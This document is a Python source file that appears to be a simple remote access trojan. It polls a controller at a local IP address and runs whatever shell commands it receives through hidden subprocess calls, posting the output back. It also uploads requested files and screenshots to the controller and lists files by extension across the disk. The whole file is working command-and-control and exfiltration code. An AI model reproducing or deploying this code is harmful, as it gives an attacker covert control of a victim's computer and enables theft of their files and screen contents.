import requests
import subprocess
import time
import os
import random
from PIL import ImageGrab as imagegrab
import tempfile
import shutil

def subprocess_args(include_stdout=True):
    shell = True
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        env = os.environ
    else:
        si = None
        env = None
    if include_stdout:
        ret = {'stdout': subprocess.PIPE}
    else:
        ret = {}
    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env,
                'shell': shell})
    return ret

def grabfile(path):
    if os.path.exists(path):
        rpath = os.path.realpath(path)
        url = 'http://192.168.0.10/store'
        files = {'file': open(path, 'rb'),'path': rpath}
        r = requests.post(url, files=files)
    else:
        post_response = requests.post(url='http://192.168.0.10',data='[-] Not able to find the file.')

def takescreenshot():
    dirpath = tempfile.mkdtemp()
    path = dirpath + '\img.jpg'
    imagegrab.grab().save(path, "JPEG")
    url = 'http://192.168.0.10/store'
    files = {'file': open(path, 'rb'),'path': 'screencap.jpg'}
    r = requests.post(url, files=files)
    files['file'].close()
    shutil.rmtree(dirpath)

def search(path,ext):
    list = ''
    for dirpath, dirname, files in os.walk(path):
        for file in files:
            if file.endswith(ext):
                list = list + '\n' + os.path.join(dirpath,file)
    requests.post(url='http://192.168.0.10',data=list)

def connect():
    while True:
        req = requests.get('http://192.168.0.10')
        command = req.text

        if "terminate" in command:
            return 1
        elif 'grab' in command:
            grab,path = command.split(" * ")
            grabfile(path)
        elif 'screencap' in command:
            takescreenshot()
        elif 'search' in command:
            command = command[7:]
            print(command)
            path,ext = command.split('*')
            search(path,ext)
        else:
            CMD = subprocess.Popen(command,**subprocess_args(True))
            post_response = requests.post(url='http://192.168.0.10', data=CMD.stdout.read())
            post_response = requests.post(url='http://192.168.0.10', data=CMD.stderr.read())

        time.sleep(3)

def main():
    while True:
        try:
            if connect() == 1:
                break
        except:
            sleep_for = random.randrange(1,10)
            time.sleep(sleep_for)       #Sleep for a random time between 1 and 10 seconds
            #time.sleep(sleep_for * 60) #Sleep for a random time between 1 and 10 minutes
            pass
    
main()
